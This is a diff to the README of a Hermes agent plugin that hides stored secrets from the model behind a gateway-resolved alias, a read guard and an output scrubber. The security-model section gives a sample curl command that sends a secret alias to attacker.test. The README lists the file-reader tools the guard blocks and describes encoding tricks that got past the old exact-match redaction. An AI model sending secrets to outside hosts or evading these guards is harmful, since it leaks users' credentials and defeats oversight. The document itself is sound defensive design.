@@ -1,6 +1,6 @@
 # secret-drop
 
-Give Hermes a password or token without putting it in the chat or showing it to the model.
+Give Hermes a password or token without putting the value in the chat, and use it through an alias that only the gateway resolves.
 
 This is a standalone Hermes plugin. It is not part of the Hermes core tree. Install the repository root into `~/.hermes/plugins/`. That is the distribution path described in [CONTRIBUTING.md](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md) and [Build a Hermes Plugin](https://hermes-agent.nousresearch.com/docs/developer-guide/plugins).
 
@@ -19,9 +19,24 @@ The response does not contain the value. Nothing is written into the transcript 
 
 When the dashboard is serving more than one profile, the desktop `profile` query selects which profile receives the value. A request for another profile does not write the launch profile's `.env`.
 
-Custom names are added to the raw `terminal.env_passthrough` list, so later sandboxed commands can expand `$NAME`. That write does not save the defaults-merged config, so `${...}` templates already in `config.yaml` stay templates. Provider and platform credentials such as `OPENAI_API_KEY` or `GITHUB_TOKEN` are stored but not forwarded.
+Custom names are added to the raw `terminal.env_passthrough` list, so later sandboxed commands can expand `$NAME`. That write does not save the defaults-merged config, so `${...}` templates already in `config.yaml` stay templates. Provider and platform credentials such as `OPENAI_API_KEY` or `GITHUB_TOKEN` are stored, but not forwarded into commands and not injectable through an alias.
 
-If a command prints the raw value, tool output replaces it with `«redacted-vault-secret»` only when the value is specific enough to redact: at least 8 characters and containing a digit or symbol, or at least 24 characters. A short value or a plain word such as `password` is stored, and is not used as a global search-and-replace. Hermes keeps at most 64 of these exact values in memory per profile; this plugin records the variable names in `secret-drop-names` and registers the values again on session start. A command that encodes the value first is not covered by that exact-match redaction.
+## Using a secret: `{{secret:NAME}}`
+
+The model never writes the value. It refers to the secret by alias:
+
+```text
+curl -H "Authorization: Bearer {{secret:GITHUB_TOKEN}}" https://api.example.test/user
+```
+
+A `pre_tool_call` hook replaces every `{{secret:NAME}}` in the `command` of `terminal` and in the `code` of `execute_code` with the stored value, immediately before the call runs. The replacement exists only in the arguments handed to the executor; it is not written back to the assistant message. An unknown name, an empty value, a provider credential, or a malformed alias blocks the call with a message that names the alias as the right way and contains no value.
+
+Direct attempts to read the store are blocked in the same hook:
+
+- `read_file` and `search_files` on `.env`, `secret-drop-names`, or anything under `secret-drops/`,
+- `terminal` and `execute_code` text that addresses those paths with a reader (`cat`, `head`, `tail`, `less`, `grep`, `strings`, `awk`, `sed`, `base64`, `hexdump`, `xxd`, `od`, a Python/Perl/Node one-liner with an opening read, and similar).
+
+Output is scrubbed before it reaches the model. `transform_terminal_output` and `transform_tool_result` replace stored values with `«redacted-vault-secret»`, including base64 (standard and URL-safe, padded and unpadded), hex (lower and upper case), URL encoding, the reversed string, and versions split by spaces, dots, or `#`. Only values that pass `registers_for_redaction` are searched: at least 8 characters with a digit or symbol, or at least 24 characters. A short value or a plain word such as `password` is stored but never used as a global search-and-replace, so ordinary text stays intact.
 
 The same guidance is added to the session prompt when Hermes supports plugin prompt sections. The bundled skill `secret-drop:secret-drop` is listed by `skills_list` and is not copied into `~/.hermes/skills/`.
 
@@ -29,37 +44,40 @@ The same guidance is added to the session prompt when Hermes supports plugin pro
 
 ## Security model — what this does and does not guarantee
 
-This plugin solves one specific problem: it keeps a secret out of the chat
-transcript, the model prompt, and prompt caches. It is **not** a sandbox that
-hides the value from the model.
+This plugin keeps a secret out of the chat transcript, the model prompt, the
+conversation history, and the request sent to the model provider.
 
 **What it guarantees:**
 
-- The value never enters the chat or the model context. The model only ever
-  sees the variable name (`$DEPLOY_PASSWORD`), never the value.
+- The value is not part of the chat, the model context, or prompt caches. The
+  model writes `{{secret:NAME}}`; the gateway substitutes the value only in the
+  in-memory tool arguments immediately before execution.
 - The value is stored in the profile `.env` with owner-only permissions
   (mode `0600`), and the temporary drop file is deleted after storing.
-- Tool output that prints the raw value is redacted
-  (`«redacted-vault-secret»`) when the value is specific enough to match.
+- Reads of the secret store from `read_file`, `search_files`, `terminal`, and
+  `execute_code` are blocked by the `pre_tool_call` guard.
+- Stored values and their common encodings are scrubbed from tool output before
+  the model sees it.
 
 **What it does NOT guarantee:**
 
-- The model has tools (terminal, file reads) and can read the value if it
-  wants to — for example `cat ~/.hermes/.env` or `echo $DEPLOY_PASSWORD`.
-  Redaction is exact-match only: a command that encodes the value first
-  (base64, hex, character-by-character) is not covered.
-- This is a convenience and a default-safety layer against *accidental*
-  leaks, not a security boundary against a malicious or compromised model.
+- The model can still *use* a secret it cannot see. A command such as
+  `curl -H "Authorization: Bearer {{secret:NAME}}" https://attacker.test` is
+  executed by the gateway, and the gateway sends the request. Aliasing protects
+  confidentiality in the model context, not the effects of a command.
+- A value that no rule recognizes (an encoding outside the list above, a
+  substring transformation, a program that re-emits it in a new form) can still
+  appear in output.
+- The plugin runs inside the gateway process. It is not a boundary against a
+  compromised gateway, a modified plugin, or a host-level attacker who can read
+  the `.env`.
 
-**Rule of thumb:** trust this plugin to keep secrets out of prompts and
-transcripts. Do **not** trust it as a security boundary against a model that
-deliberately tries to read the value — for that you need real secret
-isolation (for example secrets held in a separate process the model cannot
-reach).
+**Rule of thumb:** trust the alias to keep the value out of prompts, transcripts,
+and provider requests. Do not treat it as a sandbox for the effects of commands.
 
 ## Limits
 
-The value must be non-empty ASCII, at most 8192 characters, and must not contain a line break or a NUL. Names have to be normal environment variable names. Hermes refuses names that steer a subprocess (`PATH`, `LD_PRELOAD`, `PYTHONPATH`, and the rest of that denylist).
+The value must be non-empty ASCII, at most 8192 characters, and must not contain a line break or a NUL. Names have to be normal environment variable names. Hermes refuses names that steer a subprocess (`PATH`, `LD_PRELOAD`, `PYTHONPATH`, and the rest of that denylist). The drop route reads its body under a hard 32 KiB cap and rejects larger requests with HTTP 413 before parsing them.
 
 ## Layout
 
@@ -70,8 +88,9 @@ A `plugin.yaml` nested in a subdirectory is recorded as a path key (`hermes-secr
 ```
 hermes-secret-drop/
 ├── plugin.yaml                 # name: secret-drop
-├── __init__.py                 # /secret, session-start redaction reload, session prompt
+├── __init__.py                 # /secret, hook registration, session prompt
 ├── secret_drop.py              # file drop, .env store, wipe
+├── secret_guard.py             # alias substitution, read guard, output scrubber
 ├── skills/secret-drop/SKILL.md
 ├── dashboard/
 │   ├── manifest.json           # name: secret-drop
@@ -82,7 +101,7 @@ hermes-secret-drop/
 
 Hermes loads that one file as a script. A second module next to it, including `import './i18n'`, is rejected, and the key button does not register.
 
-The agent half follows `plugins.enabled` and needs a gateway restart so the route is mounted. The desktop half stays off until its own switch is on.
+The agent half follows `plugins.enabled` and needs a gateway restart so the route and hooks are mounted. The desktop half stays off until its own switch is on.
 
 ## Install
 
@@ -108,5 +127,5 @@ A catalog entry is a separate reviewed pull request in `NousResearch/hermes-agen
 From this directory, with the Hermes checkout importable:
 
 ```bash
-PYTHONPATH=/path/to/hermes-agent python -m pytest tests/test_drop.py
+PYTHONPATH=/path/to/hermes-agent python -m pytest tests/ -q
 ```
